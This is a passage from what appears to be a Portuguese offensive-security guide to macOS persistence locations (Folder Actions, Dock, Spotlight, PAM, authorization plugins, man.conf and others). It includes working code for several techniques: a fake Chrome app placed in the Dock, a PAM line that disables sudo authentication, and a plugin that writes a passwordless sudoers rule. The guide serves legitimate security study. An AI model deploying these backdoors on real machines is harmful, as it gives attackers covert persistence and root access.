Escrita: [https://theevilbit.github.io/beyond/beyond_0024/](https://theevilbit.github.io/beyond/beyond_0024/)\
Escrita: [https://posts.specterops.io/folder-actions-for-persistence-on-macos-8923f222343d](https://posts.specterops.io/folder-actions-for-persistence-on-macos-8923f222343d)

- Útil para contornar sandbox: [✅](https://emojipedia.org/check-mark-button)
- Mas você precisa ser capaz de chamar `osascript` com argumentos para contatar **`System Events`** para poder configurar Ações de Pasta
- Bypass TCC: [🟠](https://emojipedia.org/large-orange-circle)
- Possui algumas permissões básicas do TCC, como Desktop, Documents e Downloads

#### Localização

- **`/Library/Scripts/Folder Action Scripts`**
- Root necessário
- **Gatilho**: Acesso à pasta especificada
- **`~/Library/Scripts/Folder Action Scripts`**
- **Gatilho**: Acesso à pasta especificada

#### Descrição & Exploração

Ações de Pasta são scripts automaticamente acionados por mudanças em uma pasta, como adicionar, remover itens ou outras ações, como abrir ou redimensionar a janela da pasta. Essas ações podem ser utilizadas para várias tarefas e podem ser acionadas de diferentes maneiras, como usando a interface do Finder ou comandos de terminal.

Para configurar Ações de Pasta, você tem opções como:

1. Criar um fluxo de trabalho de Ação de Pasta com [Automator](https://support.apple.com/guide/automator/welcome/mac) e instalá-lo como um serviço.
2. Anexar um script manualmente via a Configuração de Ações de Pasta no menu de contexto de uma pasta.
3. Utilizar OSAScript para enviar mensagens de Evento Apple para o `System Events.app` para configurar programaticamente uma Ação de Pasta.
- Este método é particularmente útil para embutir a ação no sistema, oferecendo um nível de persistência.

O seguinte script é um exemplo do que pode ser executado por uma Ação de Pasta:
```applescript
// source.js
var app = Application.currentApplication();
app.includeStandardAdditions = true;
app.doShellScript("touch /tmp/folderaction.txt");
app.doShellScript("touch ~/Desktop/folderaction.txt");
app.doShellScript("mkdir /tmp/asd123");
app.doShellScript("cp -R ~/Desktop /tmp/asd123");
```
Para tornar o script acima utilizável por Ações de Pasta, compile-o usando:
```bash
osacompile -l JavaScript -o folder.scpt source.js
```
Após a compilação do script, configure as Ações de Pasta executando o script abaixo. Este script ativará as Ações de Pasta globalmente e anexará especificamente o script compilado anteriormente à pasta Desktop.
```javascript
// Enabling and attaching Folder Action
var se = Application("System Events")
se.folderActionsEnabled = true
var myScript = se.Script({ name: "source.js", posixPath: "/tmp/source.js" })
var fa = se.FolderAction({ name: "Desktop", path: "/Users/username/Desktop" })
se.folderActions.push(fa)
fa.scripts.push(myScript)
```
Execute o script de configuração com:
```bash
osascript -l JavaScript /Users/username/attach.scpt
```
- Esta é a maneira de implementar essa persistência via GUI:

Este é o script que será executado:
```applescript:source.js
var app = Application.currentApplication();
app.includeStandardAdditions = true;
app.doShellScript("touch /tmp/folderaction.txt");
app.doShellScript("touch ~/Desktop/folderaction.txt");
app.doShellScript("mkdir /tmp/asd123");
app.doShellScript("cp -R ~/Desktop /tmp/asd123");
```
Compile-o com: `osacompile -l JavaScript -o folder.scpt source.js`

Mova-o para:
```bash
mkdir -p "$HOME/Library/Scripts/Folder Action Scripts"
mv /tmp/folder.scpt "$HOME/Library/Scripts/Folder Action Scripts"
```
Então, abra o aplicativo `Folder Actions Setup`, selecione a **pasta que você gostaria de monitorar** e selecione no seu caso **`folder.scpt`** (no meu caso, eu o chamei de output2.scp):

<figure><img src="../images/image (39).png" alt="" width="297"><figcaption></figcaption></figure>

Agora, se você abrir essa pasta com o **Finder**, seu script será executado.

Essa configuração foi armazenada no **plist** localizado em **`~/Library/Preferences/com.apple.FolderActionsDispatcher.plist`** em formato base64.

Agora, vamos tentar preparar essa persistência sem acesso à GUI:

1. **Copie `~/Library/Preferences/com.apple.FolderActionsDispatcher.plist`** para `/tmp` para fazer um backup:
- `cp ~/Library/Preferences/com.apple.FolderActionsDispatcher.plist /tmp`
2. **Remova** as Ações de Pasta que você acabou de definir:

<figure><img src="../images/image (40).png" alt=""><figcaption></figcaption></figure>

Agora que temos um ambiente vazio

3. Copie o arquivo de backup: `cp /tmp/com.apple.FolderActionsDispatcher.plist ~/Library/Preferences/`
4. Abra o Folder Actions Setup.app para consumir essa configuração: `open "/System/Library/CoreServices/Applications/Folder Actions Setup.app/"`

> [!CAUTION]
> E isso não funcionou para mim, mas essas são as instruções do relatório:(

### Atalhos do Dock

Relatório: [https://theevilbit.github.io/beyond/beyond_0027/](https://theevilbit.github.io/beyond/beyond_0027/)

- Útil para contornar o sandbox: [✅](https://emojipedia.org/check-mark-button)
- Mas você precisa ter instalado um aplicativo malicioso dentro do sistema
- Bypass TCC: [🔴](https://emojipedia.org/large-red-circle)

#### Localização

- `~/Library/Preferences/com.apple.dock.plist`
- **Gatilho**: Quando o usuário clica no aplicativo dentro do dock

#### Descrição & Exploração

Todos os aplicativos que aparecem no Dock estão especificados dentro do plist: **`~/Library/Preferences/com.apple.dock.plist`**

É possível **adicionar um aplicativo** apenas com:
```bash
# Add /System/Applications/Books.app
defaults write com.apple.dock persistent-apps -array-add '<dict><key>tile-data</key><dict><key>file-data</key><dict><key>_CFURLString</key><string>/System/Applications/Books.app</string><key>_CFURLStringType</key><integer>0</integer></dict></dict></dict>'

# Restart Dock
killall Dock
```
Usando alguma **engenharia social**, você poderia **se passar, por exemplo, pelo Google Chrome** dentro do dock e realmente executar seu próprio script:
```bash
#!/bin/sh

# THIS REQUIRES GOOGLE CHROME TO BE INSTALLED (TO COPY THE ICON)

rm -rf /tmp/Google\ Chrome.app/ 2>/dev/null

# Create App structure
mkdir -p /tmp/Google\ Chrome.app/Contents/MacOS
mkdir -p /tmp/Google\ Chrome.app/Contents/Resources

# Payload to execute
echo '#!/bin/sh
open /Applications/Google\ Chrome.app/ &
touch /tmp/ImGoogleChrome' > /tmp/Google\ Chrome.app/Contents/MacOS/Google\ Chrome

chmod +x /tmp/Google\ Chrome.app/Contents/MacOS/Google\ Chrome

# Info.plist
cat << EOF > /tmp/Google\ Chrome.app/Contents/Info.plist
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE plist PUBLIC "-//Apple//DTD PLIST 1.0//EN"
"http://www.apple.com/DTDs/PropertyList-1.0.dtd">
<plist version="1.0">
<dict>
<key>CFBundleExecutable</key>
<string>Google Chrome</string>
<key>CFBundleIdentifier</key>
<string>com.google.Chrome</string>
<key>CFBundleName</key>
<string>Google Chrome</string>
<key>CFBundleVersion</key>
<string>1.0</string>
<key>CFBundleShortVersionString</key>
<string>1.0</string>
<key>CFBundleInfoDictionaryVersion</key>
<string>6.0</string>
<key>CFBundlePackageType</key>
<string>APPL</string>
<key>CFBundleIconFile</key>
<string>app</string>
</dict>
</plist>
EOF

# Copy icon from Google Chrome
cp /Applications/Google\ Chrome.app/Contents/Resources/app.icns /tmp/Google\ Chrome.app/Contents/Resources/app.icns

# Add to Dock
defaults write com.apple.dock persistent-apps -array-add '<dict><key>tile-data</key><dict><key>file-data</key><dict><key>_CFURLString</key><string>/tmp/Google Chrome.app</string><key>_CFURLStringType</key><integer>0</integer></dict></dict></dict>'
killall Dock
```
### Seletor de Cores

Writeup: [https://theevilbit.github.io/beyond/beyond_0017](https://theevilbit.github.io/beyond/beyond_0017/)

- Útil para contornar o sandbox: [🟠](https://emojipedia.org/large-orange-circle)
- Uma ação muito específica precisa acontecer
- Você acabará em outro sandbox
- Bypass TCC: [🔴](https://emojipedia.org/large-red-circle)

#### Localização

- `/Library/ColorPickers`
- Root necessário
- Gatilho: Use o seletor de cores
- `~/Library/ColorPickers`
- Gatilho: Use o seletor de cores

#### Descrição & Exploit

**Compile um seletor de cores** bundle com seu código (você pode usar [**este aqui, por exemplo**](https://github.com/viktorstrate/color-picker-plus)) e adicione um construtor (como na [seção de Protetor de Tela](macos-auto-start-locations.md#screen-saver)) e copie o bundle para `~/Library/ColorPickers`.

Então, quando o seletor de cores for acionado, seu código também deverá ser.

Note que o binário que carrega sua biblioteca tem um **sandbox muito restritivo**: `/System/Library/Frameworks/AppKit.framework/Versions/C/XPCServices/LegacyExternalColorPickerService-x86_64.xpc/Contents/MacOS/LegacyExternalColorPickerService-x86_64`
```bash
[Key] com.apple.security.temporary-exception.sbpl
[Value]
[Array]
[String] (deny file-write* (home-subpath "/Library/Colors"))
[String] (allow file-read* process-exec file-map-executable (home-subpath "/Library/ColorPickers"))
[String] (allow file-read* (extension "com.apple.app-sandbox.read"))
```
### Finder Sync Plugins

**Writeup**: [https://theevilbit.github.io/beyond/beyond_0026/](https://theevilbit.github.io/beyond/beyond_0026/)\
**Writeup**: [https://objective-see.org/blog/blog_0x11.html](https://objective-see.org/blog/blog_0x11.html)

- Útil para contornar sandbox: **Não, porque você precisa executar seu próprio aplicativo**
- Bypass TCC: ???

#### Localização

- Um aplicativo específico

#### Descrição & Exploit

Um exemplo de aplicativo com uma Extensão de Sincronização do Finder [**pode ser encontrado aqui**](https://github.com/D00MFist/InSync).

Os aplicativos podem ter `Finder Sync Extensions`. Esta extensão irá dentro de um aplicativo que será executado. Além disso, para que a extensão possa executar seu código, ela **deve ser assinada** com algum certificado de desenvolvedor da Apple válido, deve ser **sandboxed** (embora exceções relaxadas possam ser adicionadas) e deve ser registrada com algo como:
```bash
pluginkit -a /Applications/FindIt.app/Contents/PlugIns/FindItSync.appex
pluginkit -e use -i com.example.InSync.InSync
```
### Protetor de Tela

Writeup: [https://theevilbit.github.io/beyond/beyond_0016/](https://theevilbit.github.io/beyond/beyond_0016/)\
Writeup: [https://posts.specterops.io/saving-your-access-d562bf5bf90b](https://posts.specterops.io/saving-your-access-d562bf5bf90b)

- Útil para contornar sandbox: [🟠](https://emojipedia.org/large-orange-circle)
- Mas você acabará em uma sandbox de aplicativo comum
- Bypass TCC: [🔴](https://emojipedia.org/large-red-circle)

#### Localização

- `/System/Library/Screen Savers`
- Root necessário
- **Gatilho**: Selecione o protetor de tela
- `/Library/Screen Savers`
- Root necessário
- **Gatilho**: Selecione o protetor de tela
- `~/Library/Screen Savers`
- **Gatilho**: Selecione o protetor de tela

<figure><img src="../images/image (38).png" alt="" width="375"><figcaption></figcaption></figure>

#### Descrição & Exploit

Crie um novo projeto no Xcode e selecione o modelo para gerar um novo **Protetor de Tela**. Em seguida, adicione seu código a ele, por exemplo, o seguinte código para gerar logs.

**Compile** e copie o pacote `.saver` para **`~/Library/Screen Savers`**. Depois, abra a GUI do Protetor de Tela e, se você apenas clicar nele, deve gerar muitos logs:
```bash
sudo log stream --style syslog --predicate 'eventMessage CONTAINS[c] "hello_screensaver"'

Timestamp                       (process)[PID]
2023-09-27 22:55:39.622369+0200  localhost legacyScreenSaver[41737]: (ScreenSaverExample) hello_screensaver void custom(int, const char **)
2023-09-27 22:55:39.622623+0200  localhost legacyScreenSaver[41737]: (ScreenSaverExample) hello_screensaver -[ScreenSaverExampleView initWithFrame:isPreview:]
2023-09-27 22:55:39.622704+0200  localhost legacyScreenSaver[41737]: (ScreenSaverExample) hello_screensaver -[ScreenSaverExampleView hasConfigureSheet]
```
> [!CAUTION]
> Note que, devido ao fato de que dentro das permissões do binário que carrega este código (`/System/Library/Frameworks/ScreenSaver.framework/PlugIns/legacyScreenSaver.appex/Contents/MacOS/legacyScreenSaver`), você pode encontrar **`com.apple.security.app-sandbox`**, você estará **dentro do sandbox de aplicativo comum**.

Saver code:
```objectivec
//
//  ScreenSaverExampleView.m
//  ScreenSaverExample
//
//  Created by Carlos Polop on 27/9/23.
//

#import "ScreenSaverExampleView.h"

@implementation ScreenSaverExampleView

- (instancetype)initWithFrame:(NSRect)frame isPreview:(BOOL)isPreview
{
NSLog(@"hello_screensaver %s", __PRETTY_FUNCTION__);
self = [super initWithFrame:frame isPreview:isPreview];
if (self) {
[self setAnimationTimeInterval:1/30.0];
}
return self;
}

- (void)startAnimation
{
NSLog(@"hello_screensaver %s", __PRETTY_FUNCTION__);
[super startAnimation];
}

- (void)stopAnimation
{
NSLog(@"hello_screensaver %s", __PRETTY_FUNCTION__);
[super stopAnimation];
}

- (void)drawRect:(NSRect)rect
{
NSLog(@"hello_screensaver %s", __PRETTY_FUNCTION__);
[super drawRect:rect];
}

- (void)animateOneFrame
{
NSLog(@"hello_screensaver %s", __PRETTY_FUNCTION__);
return;
}

- (BOOL)hasConfigureSheet
{
NSLog(@"hello_screensaver %s", __PRETTY_FUNCTION__);
return NO;
}

- (NSWindow*)configureSheet
{
NSLog(@"hello_screensaver %s", __PRETTY_FUNCTION__);
return nil;
}

__attribute__((constructor))
void custom(int argc, const char **argv) {
NSLog(@"hello_screensaver %s", __PRETTY_FUNCTION__);
}

@end
```
### Spotlight Plugins

writeup: [https://theevilbit.github.io/beyond/beyond_0011/](https://theevilbit.github.io/beyond/beyond_0011/)

- Útil para contornar o sandbox: [🟠](https://emojipedia.org/large-orange-circle)
- Mas você acabará em um sandbox de aplicativo
- Bypass TCC: [🔴](https://emojipedia.org/large-red-circle)
- O sandbox parece muito limitado

#### Localização

- `~/Library/Spotlight/`
- **Gatilho**: Um novo arquivo com uma extensão gerenciada pelo plugin do spotlight é criado.
- `/Library/Spotlight/`
- **Gatilho**: Um novo arquivo com uma extensão gerenciada pelo plugin do spotlight é criado.
- Root necessário
- `/System/Library/Spotlight/`
- **Gatilho**: Um novo arquivo com uma extensão gerenciada pelo plugin do spotlight é criado.
- Root necessário
- `Some.app/Contents/Library/Spotlight/`
- **Gatilho**: Um novo arquivo com uma extensão gerenciada pelo plugin do spotlight é criado.
- Novo aplicativo necessário

#### Descrição & Exploração

Spotlight é o recurso de busca integrado do macOS, projetado para fornecer aos usuários **acesso rápido e abrangente aos dados em seus computadores**.\
Para facilitar essa capacidade de busca rápida, o Spotlight mantém um **banco de dados proprietário** e cria um índice **analisando a maioria dos arquivos**, permitindo buscas rápidas tanto por nomes de arquivos quanto por seu conteúdo.

O mecanismo subjacente do Spotlight envolve um processo central chamado 'mds', que significa **'servidor de metadados'.** Este processo orquestra todo o serviço Spotlight. Complementando isso, existem vários daemons 'mdworker' que realizam uma variedade de tarefas de manutenção, como indexar diferentes tipos de arquivos (`ps -ef | grep mdworker`). Essas tarefas são possibilitadas por meio de plugins importadores do Spotlight, ou **".mdimporter bundles"**, que permitem que o Spotlight entenda e indexe conteúdo em uma ampla gama de formatos de arquivo.

Os plugins ou **`.mdimporter`** bundles estão localizados nos lugares mencionados anteriormente e, se um novo bundle aparecer, ele é carregado em um minuto (não é necessário reiniciar nenhum serviço). Esses bundles precisam indicar quais **tipos de arquivo e extensões podem gerenciar**, dessa forma, o Spotlight os usará quando um novo arquivo com a extensão indicada for criado.

É possível **encontrar todos os `mdimporters`** carregados executando:
```bash
mdimport -L
Paths: id(501) (
"/System/Library/Spotlight/iWork.mdimporter",
"/System/Library/Spotlight/iPhoto.mdimporter",
"/System/Library/Spotlight/PDF.mdimporter",
[...]
```
E, por exemplo, **/Library/Spotlight/iBooksAuthor.mdimporter** é usado para analisar esse tipo de arquivos (extensões `.iba` e `.book`, entre outros):
```json
plutil -p /Library/Spotlight/iBooksAuthor.mdimporter/Contents/Info.plist

[...]
"CFBundleDocumentTypes" => [
0 => {
"CFBundleTypeName" => "iBooks Author Book"
"CFBundleTypeRole" => "MDImporter"
"LSItemContentTypes" => [
0 => "com.apple.ibooksauthor.book"
1 => "com.apple.ibooksauthor.pkgbook"
2 => "com.apple.ibooksauthor.template"
3 => "com.apple.ibooksauthor.pkgtemplate"
]
"LSTypeIsPackage" => 0
}
]
[...]
=> {
"UTTypeConformsTo" => [
0 => "public.data"
1 => "public.composite-content"
]
"UTTypeDescription" => "iBooks Author Book"
"UTTypeIdentifier" => "com.apple.ibooksauthor.book"
"UTTypeReferenceURL" => "http://www.apple.com/ibooksauthor"
"UTTypeTagSpecification" => {
"public.filename-extension" => [
0 => "iba"
1 => "book"
]
}
}
[...]
```
> [!CAUTION]
> Se você verificar o Plist de outros `mdimporter`, pode não encontrar a entrada **`UTTypeConformsTo`**. Isso ocorre porque é um _Identificadores de Tipo Uniforme_ ([UTI](https://en.wikipedia.org/wiki/Uniform_Type_Identifier)) embutido e não precisa especificar extensões.
>
> Além disso, os plugins padrão do sistema sempre têm precedência, então um atacante só pode acessar arquivos que não estão indexados pelos próprios `mdimporters` da Apple.

Para criar seu próprio importador, você pode começar com este projeto: [https://github.com/megrimm/pd-spotlight-importer](https://github.com/megrimm/pd-spotlight-importer) e então mudar o nome, o **`CFBundleDocumentTypes`** e adicionar **`UTImportedTypeDeclarations`** para que suporte a extensão que você gostaria de suportar e refletir isso em **`schema.xml`**.\
Então **mude** o código da função **`GetMetadataForFile`** para executar seu payload quando um arquivo com a extensão processada for criado.

Finalmente, **construa e copie seu novo `.mdimporter`** para um dos locais anteriores e você pode verificar sempre que ele for carregado **monitorando os logs** ou verificando **`mdimport -L.`**

### ~~Painel de Preferências~~

> [!CAUTION]
> Não parece que isso esteja funcionando mais.

Escrita: [https://theevilbit.github.io/beyond/beyond_0009/](https://theevilbit.github.io/beyond/beyond_0009/)

- Útil para contornar o sandbox: [🟠](https://emojipedia.org/large-orange-circle)
- Precisa de uma ação específica do usuário
- Bypass TCC: [🔴](https://emojipedia.org/large-red-circle)

#### Localização

- **`/System/Library/PreferencePanes`**
- **`/Library/PreferencePanes`**
- **`~/Library/PreferencePanes`**

#### Descrição

Não parece que isso esteja funcionando mais.

## Bypass de Sandbox Root

> [!TIP]
> Aqui você pode encontrar locais de início úteis para **bypass de sandbox** que permitem que você simplesmente execute algo **escrevendo em um arquivo** sendo **root** e/ou exigindo outras **condições estranhas.**

### Periódico

Escrita: [https://theevilbit.github.io/beyond/beyond_0019/](https://theevilbit.github.io/beyond/beyond_0019/)

- Útil para contornar o sandbox: [🟠](https://emojipedia.org/large-orange-circle)
- Mas você precisa ser root
- Bypass TCC: [🔴](https://emojipedia.org/large-red-circle)

#### Localização

- `/etc/periodic/daily`, `/etc/periodic/weekly`, `/etc/periodic/monthly`, `/usr/local/etc/periodic`
- Root necessário
- **Gatilho**: Quando chegar a hora
- `/etc/daily.local`, `/etc/weekly.local` ou `/etc/monthly.local`
- Root necessário
- **Gatilho**: Quando chegar a hora

#### Descrição & Exploração

Os scripts periódicos (**`/etc/periodic`**) são executados devido aos **launch daemons** configurados em `/System/Library/LaunchDaemons/com.apple.periodic*`. Note que os scripts armazenados em `/etc/periodic/` são **executados** como o **proprietário do arquivo**, então isso não funcionará para uma potencial escalada de privilégios.
```bash
# Launch daemons that will execute the periodic scripts
ls -l /System/Library/LaunchDaemons/com.apple.periodic*
-rw-r--r--  1 root  wheel  887 May 13 00:29 /System/Library/LaunchDaemons/com.apple.periodic-daily.plist
-rw-r--r--  1 root  wheel  895 May 13 00:29 /System/Library/LaunchDaemons/com.apple.periodic-monthly.plist
-rw-r--r--  1 root  wheel  891 May 13 00:29 /System/Library/LaunchDaemons/com.apple.periodic-weekly.plist

# The scripts located in their locations
ls -lR /etc/periodic
total 0
drwxr-xr-x  11 root  wheel  352 May 13 00:29 daily
drwxr-xr-x   5 root  wheel  160 May 13 00:29 monthly
drwxr-xr-x   3 root  wheel   96 May 13 00:29 weekly

/etc/periodic/daily:
total 72
-rwxr-xr-x  1 root  wheel  1642 May 13 00:29 110.clean-tmps
-rwxr-xr-x  1 root  wheel   695 May 13 00:29 130.clean-msgs
[...]

/etc/periodic/monthly:
total 24
-rwxr-xr-x  1 root  wheel   888 May 13 00:29 199.rotate-fax
-rwxr-xr-x  1 root  wheel  1010 May 13 00:29 200.accounting
-rwxr-xr-x  1 root  wheel   606 May 13 00:29 999.local

/etc/periodic/weekly:
total 8
-rwxr-xr-x  1 root  wheel  620 May 13 00:29 999.local
```
Existem outros scripts periódicos que serão executados indicados em **`/etc/defaults/periodic.conf`**:
```bash
grep "Local scripts" /etc/defaults/periodic.conf
daily_local="/etc/daily.local"				# Local scripts
weekly_local="/etc/weekly.local"			# Local scripts
monthly_local="/etc/monthly.local"			# Local scripts
```
Se você conseguir escrever em qualquer um dos arquivos `/etc/daily.local`, `/etc/weekly.local` ou `/etc/monthly.local`, ele será **executado mais cedo ou mais tarde**.

> [!WARNING]
> Note que o script periódico será **executado como o proprietário do script**. Portanto, se um usuário comum for o proprietário do script, ele será executado como esse usuário (isso pode prevenir ataques de escalonamento de privilégios).

### PAM

Escrita: [Linux Hacktricks PAM](../linux-hardening/linux-post-exploitation/pam-pluggable-authentication-modules.md)\
Escrita: [https://theevilbit.github.io/beyond/beyond_0005/](https://theevilbit.github.io/beyond/beyond_0005/)

- Útil para contornar sandbox: [🟠](https://emojipedia.org/large-orange-circle)
- Mas você precisa ser root
- Contorno TCC: [🔴](https://emojipedia.org/large-red-circle)

#### Localização

- Root sempre necessário

#### Descrição & Exploração

Como o PAM está mais focado em **persistência** e malware do que em execução fácil dentro do macOS, este blog não dará uma explicação detalhada, **leia as escritas para entender melhor esta técnica**.

Verifique os módulos PAM com:
```bash
ls -l /etc/pam.d
```
Uma técnica de persistência/escalonamento de privilégios que abusa do PAM é tão fácil quanto modificar o módulo /etc/pam.d/sudo adicionando no início a linha:
```bash
auth       sufficient     pam_permit.so
```
Então vai **parecer** algo assim:
```bash
# sudo: auth account password session
auth       sufficient     pam_permit.so
auth       include        sudo_local
auth       sufficient     pam_smartcard.so
auth       required       pam_opendirectory.so
account    required       pam_permit.so
password   required       pam_deny.so
session    required       pam_permit.so
```
E, portanto, qualquer tentativa de usar **`sudo` funcionará**.

> [!CAUTION]
> Note que este diretório é protegido pelo TCC, então é altamente provável que o usuário receba um aviso solicitando acesso.

Outro bom exemplo é o su, onde você pode ver que também é possível fornecer parâmetros para os módulos PAM (e você também poderia backdoor este arquivo):
```bash
cat /etc/pam.d/su
# su: auth account session
auth       sufficient     pam_rootok.so
auth       required       pam_opendirectory.so
account    required       pam_group.so no_warn group=admin,wheel ruser root_only fail_safe
account    required       pam_opendirectory.so no_check_shell
password   required       pam_opendirectory.so
session    required       pam_launchd.so
```
### Plugins de Autorização

Writeup: [https://theevilbit.github.io/beyond/beyond_0028/](https://theevilbit.github.io/beyond/beyond_0028/)\
Writeup: [https://posts.specterops.io/persistent-credential-theft-with-authorization-plugins-d17b34719d65](https://posts.specterops.io/persistent-credential-theft-with-authorization-plugins-d17b34719d65)

- Útil para contornar sandbox: [🟠](https://emojipedia.org/large-orange-circle)
- Mas você precisa ser root e fazer configurações extras
- Bypass TCC: ???

#### Localização

- `/Library/Security/SecurityAgentPlugins/`
- Root necessário
- Também é necessário configurar o banco de dados de autorização para usar o plugin

#### Descrição & Exploração

Você pode criar um plugin de autorização que será executado quando um usuário fizer login para manter a persistência. Para mais informações sobre como criar um desses plugins, consulte os writeups anteriores (e tenha cuidado, um mal escrito pode te trancar para fora e você precisará limpar seu mac a partir do modo de recuperação).
```objectivec
// Compile the code and create a real bundle
// gcc -bundle -framework Foundation main.m -o CustomAuth
// mkdir -p CustomAuth.bundle/Contents/MacOS
// mv CustomAuth CustomAuth.bundle/Contents/MacOS/

#import <Foundation/Foundation.h>

__attribute__((constructor)) static void run()
{
NSLog(@"%@", @"[+] Custom Authorization Plugin was loaded");
system("echo \"%staff ALL=(ALL) NOPASSWD:ALL\" >> /etc/sudoers");
}
```
**Mova** o pacote para o local a ser carregado:
```bash
cp -r CustomAuth.bundle /Library/Security/SecurityAgentPlugins/
```
Finalmente, adicione a **regra** para carregar este Plugin:
```bash
cat > /tmp/rule.plist <<EOF
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE plist PUBLIC "-//Apple//DTD PLIST 1.0//EN" "http://www.apple.com/DTDs/PropertyList-1.0.dtd">
<plist version="1.0">
<dict>
<key>class</key>
<string>evaluate-mechanisms</string>
<key>mechanisms</key>
<array>
<string>CustomAuth:login,privileged</string>
</array>
</dict>
</plist>
EOF

security authorizationdb write com.asdf.asdf < /tmp/rule.plist
```
O **`evaluate-mechanisms`** informará o framework de autorização que precisará **chamar um mecanismo externo para autorização**. Além disso, **`privileged`** fará com que seja executado pelo root.

Acione-o com:
```bash
security authorize com.asdf.asdf
```
E então o **grupo de funcionários deve ter acesso sudo** (leia `/etc/sudoers` para confirmar).

### Man.conf

Escrita: [https://theevilbit.github.io/beyond/beyond_0030/](https://theevilbit.github.io/beyond/beyond_0030/)

- Útil para contornar sandbox: [🟠](https://emojipedia.org/large-orange-circle)
- Mas você precisa ser root e o usuário deve usar man
- Bypass TCC: [🔴](https://emojipedia.org/large-red-circle)

#### Localização

- **`/private/etc/man.conf`**
- Root necessário
- **`/private/etc/man.conf`**: Sempre que man é usado

#### Descrição & Exploit

O arquivo de configuração **`/private/etc/man.conf`** indica o binário/script a ser usado ao abrir arquivos de documentação man. Assim, o caminho para o executável pode ser modificado para que sempre que o usuário usar man para ler alguma documentação, um backdoor seja executado.

Por exemplo, definido em **`/private/etc/man.conf`**:
```
MANPAGER /tmp/view
```
E então crie `/tmp/view` como:
```bash
#!/bin/zsh

touch /tmp/manconf

/usr/bin/less -s
```
### Apache2

**Escrita**: [https://theevilbit.github.io/beyond/beyond_0023/](https://theevilbit.github.io/beyond/beyond_0023/)

- Útil para contornar sandbox: [🟠](https://emojipedia.org/large-orange-circle)
- Mas você precisa ser root e o apache precisa estar em execução
- Contorno TCC: [🔴](https://emojipedia.org/large-red-circle)
- Httpd não possui permissões

#### Localização

- **`/etc/apache2/httpd.conf`**
- Root necessário
- Gatilho: Quando o Apache2 é iniciado

#### Descrição & Exploit

Você pode indicar em `/etc/apache2/httpd.conf` para carregar um módulo adicionando uma linha como:
```bash
LoadModule my_custom_module /Users/Shared/example.dylib "My Signature Authority"
```
Dessa forma, seu módulo compilado será carregado pelo Apache. A única coisa é que você precisa **assiná-lo com um certificado Apple válido**, ou precisa **adicionar um novo certificado confiável** no sistema e **assiná-lo** com ele.

Então, se necessário, para garantir que o servidor será iniciado, você pode executar:
```bash
sudo launchctl load -w /System/Library/LaunchDaemons/org.apache.httpd.plist
```
Exemplo de código para o Dylb:
```objectivec
#include <stdio.h>
#include <syslog.h>

__attribute__((constructor))
static void myconstructor(int argc, const char **argv)
{
printf("[+] dylib constructor called from %s\n", argv[0]);
syslog(LOG_ERR, "[+] dylib constructor called from %s\n", argv[0]);
}
```
### BSM audit framework

Writeup: [https://theevilbit.github.io/beyond/beyond_0031/](https://theevilbit.github.io/beyond/beyond_0031/)

- Útil para contornar sandbox: [🟠](https://emojipedia.org/large-orange-circle)
- Mas você precisa ser root, auditd deve estar em execução e causar um aviso
- Bypass TCC: [🔴](https://emojipedia.org/large-red-circle)

#### Localização

- **`/etc/security/audit_warn`**
- Root necessário
- **Gatilho**: Quando auditd detecta um aviso

#### Descrição & Exploit

Sempre que auditd detecta um aviso, o script **`/etc/security/audit_warn`** é **executado**. Então você poderia adicionar seu payload nele.
```bash
echo "touch /tmp/auditd_warn" >> /etc/security/audit_warn
```
Você pode forçar um aviso com `sudo audit -n`.

### Itens de Inicialização

> [!CAUTION] > **Isso está obsoleto, então nada deve ser encontrado nessas diretórios.**

O **StartupItem** é um diretório que deve ser posicionado dentro de `/Library/StartupItems/` ou `/System/Library/StartupItems/`. Uma vez que este diretório é estabelecido, ele deve conter dois arquivos específicos:

1. Um **script rc**: Um script shell executado na inicialização.
2. Um **arquivo plist**, especificamente nomeado `StartupParameters.plist`, que contém várias configurações.

Certifique-se de que tanto o script rc quanto o arquivo `StartupParameters.plist` estejam corretamente colocados dentro do diretório **StartupItem** para que o processo de inicialização os reconheça e utilize.

{{#tabs}}
{{#tab name="StartupParameters.plist"}}
```xml
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE plist PUBLIC "-//Apple Computer//DTD PLIST 1.0//EN" "http://www.apple.com/DTDs/PropertyList-1.0.dtd">
<plist version="1.0">
<dict>
<key>Description</key>
<string>This is a description of this service</string>
<key>OrderPreference</key>
<string>None</string> <!--Other req services to execute before this -->
<key>Provides</key>
<array>
<string>superservicename</string> <!--Name of the services provided by this file -->
</array>
</dict>
</plist>
```
{{#endtab}}

{{#tab name="superservicename"}}
```bash
#!/bin/sh
. /etc/rc.common

StartService(){
touch /tmp/superservicestarted
}

StopService(){
rm /tmp/superservicestarted
}

RestartService(){
echo "Restarting"
}

RunService "$1"
```
{{#endtab}}
{{#endtabs}}

### ~~emond~~

> [!CAUTION]
> Não consigo encontrar este componente no meu macOS, então para mais informações, verifique o writeup

Writeup: [https://theevilbit.github.io/beyond/beyond_0023/](https://theevilbit.github.io/beyond/beyond_0023/)

Introduzido pela Apple, **emond** é um mecanismo de registro que parece estar subdesenvolvido ou possivelmente abandonado, mas ainda permanece acessível. Embora não seja particularmente benéfico para um administrador de Mac, este serviço obscuro poderia servir como um método sutil de persistência para atores de ameaças, provavelmente não percebido pela maioria dos administradores de macOS.

Para aqueles cientes de sua existência, identificar qualquer uso malicioso de **emond** é simples. O LaunchDaemon do sistema para este serviço busca scripts para executar em um único diretório. Para inspecionar isso, o seguinte comando pode ser usado:
```bash
ls -l /private/var/db/emondClients
```
### ~~XQuartz~~

Writeup: [https://theevilbit.github.io/beyond/beyond_0018/](https://theevilbit.github.io/beyond/beyond_0018/)

#### Localização

- **`/opt/X11/etc/X11/xinit/privileged_startx.d`**
- Requer root
- **Gatilho**: Com XQuartz

#### Descrição & Exploit

XQuartz **não está mais instalado no macOS**, então se você quiser mais informações, confira o writeup.

### ~~kext~~

> [!CAUTION]
> É tão complicado instalar kext mesmo como root que eu não considerarei isso para escapar de sandboxes ou mesmo para persistência (a menos que você tenha um exploit)

#### Localização

Para instalar um KEXT como um item de inicialização, ele precisa ser **instalado em um dos seguintes locais**:

- `/System/Library/Extensions`
- Arquivos KEXT integrados ao sistema operacional OS X.
- `/Library/Extensions`
- Arquivos KEXT instalados por software de terceiros

Você pode listar os arquivos kext atualmente carregados com:
```bash
kextstat #List loaded kext
kextload /path/to/kext.kext #Load a new one based on path
kextload -b com.apple.driver.ExampleBundle #Load a new one based on path
kextunload /path/to/kext.kext
